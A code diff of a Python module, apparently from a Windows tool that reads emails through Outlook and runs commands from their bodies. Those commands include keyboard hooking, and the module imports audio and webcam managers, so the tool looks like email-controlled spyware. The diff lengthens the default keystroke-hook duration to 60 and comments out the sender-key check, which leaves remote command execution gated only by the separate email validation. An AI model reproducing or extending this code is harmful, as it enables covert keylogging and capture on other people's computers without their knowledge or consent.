@@ -1,3 +1,5 @@
+import random
+import string
 import threading
 import time
 import win32com.client
@@ -11,10 +13,11 @@ import ManagerAudio
 import ManagerWebcam
 
 class MailBox:
-    def __init__(self,factory):
+    def __init__(self,factory = None,keyS = ""):
         print("Mailbox Init")
         self.factory = factory
         self.isStart = True
+        self.key = keyS
 
     def utilPath(self,rep):
         return rep.split("\n")[-1]
@@ -33,7 +36,7 @@ class MailBox:
                     keyboard.notificationState(_callBack)
                 elif "hook" == string[2]:
                     if string[-1] == "hook":
-                        number = 1
+                        number = 60
                     else:
                         number = int(string[-1])
                     keyboard.hook(_callBack,number)
@@ -92,11 +95,19 @@ class MailBox:
             self.mails = self.factory.createMailBox()
             for mailNow in self.mails:
                 if (mailNow.isValidate()):
-                    rep = self.listen(mailNow.getBody(), mailNow,_callBack)
-                    print("MailBox Start Rep: " + rep)
+                    #if(mailNow.isKey(self.key)):
+                        rep = self.listen(mailNow.getBody(), mailNow,_callBack)
+                        print("MailBox Start Rep: " + rep)
+                    #else:
+                    #    mailNow.sendBack("Your key is wrong","")
                 else:
                     print("False" + mailNow.getBody())
+                    mailNow.sendBack("Your email not validate","")
             time.sleep(5)
 
     def stop(self):
         self.isStart = False
+
+
+
+
